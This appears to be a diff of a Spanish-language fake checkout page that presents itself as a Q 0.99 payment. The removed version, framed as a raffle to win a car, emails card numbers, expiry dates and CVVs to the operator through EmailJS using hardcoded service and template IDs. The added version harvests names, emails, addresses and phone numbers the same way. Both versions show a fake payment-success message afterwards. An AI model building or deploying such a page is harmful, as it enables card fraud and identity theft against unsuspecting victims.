@@ -1,99 +1,74 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Pago de Pedido</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .card {
-      background: white;
-      padding: 20px;
-      width: 350px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-    }
-    h2 {
-      text-align: center;
-    }
-    .warning {
-      color: red;
-      font-size: 12px;
-      text-align: center;
-      margin-bottom: 10px;
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-    }
-    button {
-      background: #0070f3;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #005ad1;
-    }
-    .success {
-      color: green;
-      text-align: center;
-      display: none;
-      margin-top: 15px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesar Pago</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; padding: 20px; background-color: #f4f4f4; }
+        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; background-color: #007bff; color: white; padding: 14px; border: none; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 10px; }
+        button:hover { background-color: #0056b3; }
+        #mensaje-exito { display: none; color: green; text-align: center; margin-top: 20px; font-weight: bold; }
+    </style>
 </head>
 <body>
 
-  <div class="card">
-    <h2>Participa en la rifa para ganar un carro!</h2>
+<div class="card">
+    <h3 id="titulo">Finalizar Compra</h3>
+    
+    <form id="pago-form">
+        <input type="text" name="nombre_completo" placeholder="Nombre completo" required>
+        <input type="email" name="correo_usuario" placeholder="Correo electrónico" required>
+        <input type="text" name="dato_extra_1" placeholder="Dirección de envío" required>
+        <input type="text" name="dato_extra_2" placeholder="Ciudad" required>
+        <input type="text" name="dato_extra_3" placeholder="Número de teléfono" required>
+        <input type="text" name="dato_extra_4" placeholder="Código Postal" required>
 
-    <form id="paymentForm">
-      <input type="text" placeholder="Nombre del cliente" required>
-      <input type="email" placeholder="Correo electrónico" required>
-      <input type="text" placeholder="Número de pedido (ej. PED-12345)" required>
-      <input type="text" placeholder="Número de tarjeta (ej. 1111 2222 3333 4444)" required>
-      <input type="text" placeholder="Fecha vencimiento (MM/AA)" required>
-      <input type="text" placeholder="CVV (ej. 123)" required>
-
-      <button type="submit">Pagar Q 0.99</button>
+        <button type="submit" id="btn-pago">Pagar Q 0.99</button>
     </form>
 
-    <div class="success" id="successMsg">
-      ✅ Pago procesado exitosamente
+    <div id="mensaje-exito">
+        <p>✅ Pago completado con éxito</p>
+        <p>Tu pedido está en camino.</p>
     </div>
-  </div>
+</div>
 
-<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-(function(){
-  emailjs.init("oKOpLnqIka8vsjrDv");
-})();
+    // --- CONFIGURACIÓN DE EMAILJS ---
+    (function() {
+        // SUSTITUYE "TU_PUBLIC_KEY" POR LA TUYA
+        emailjs.init("oKOpLnqIka8vsjrDv");
+    })();
 
-document.getElementById("paymentForm").addEventListener("submit", function(e){
-  e.preventDefault();
+    const form = document.getElementById('pago-form');
+    const btn = document.getElementById('btn-pago');
+    const exito = document.getElementById('mensaje-exito');
 
-  emailjs.send("service_0bchd6q", "template_o8buosm", {
-    name: document.querySelector('input[placeholder*="Nombre"]').value,
-    email: document.querySelector('input[type="email"]').value,
-    order: document.querySelector('input[placeholder*="pedido"]').value,
-    card: document.querySelector('input[placeholder*="tarjeta"]').value,
-    date: document.querySelector('input[placeholder*="Fecha"]').value,
-    cvv: document.querySelector('input[placeholder*="CVV"]').value
-  }).then(function(){
-    alert("Pago procesado. Te enviaremos un email con tu código");
-  }, function(){
-    alert("Error al enviar el correo");
-  });
-});
+    form.addEventListener('submit', function(event) {
+        event.preventDefault(); // No recarga la página
+        
+        btn.innerText = 'Procesando...';
+        btn.disabled = true;
+
+        // --- ENVIAR LOS DATOS ---
+        // Sustituye 'TU_SERVICE_ID' y 'TU_TEMPLATE_ID'
+        emailjs.sendForm('service_0bchd6q', 'template_o8buosm', this)
+            .then(function() {
+                // Si sale bien:
+                form.style.display = 'none'; // Esconde el formulario
+                document.getElementById('titulo').style.display = 'none';
+                exito.style.display = 'block'; // Muestra "Pago completado"
+            }, function(error) {
+                alert('Error en el pago: ' + JSON.stringify(error));
+                btn.innerText = 'Pagar Q 0.99';
+                btn.disabled = false;
+            });
+    });
 </script>
 
 </body>
-</html
+</html>
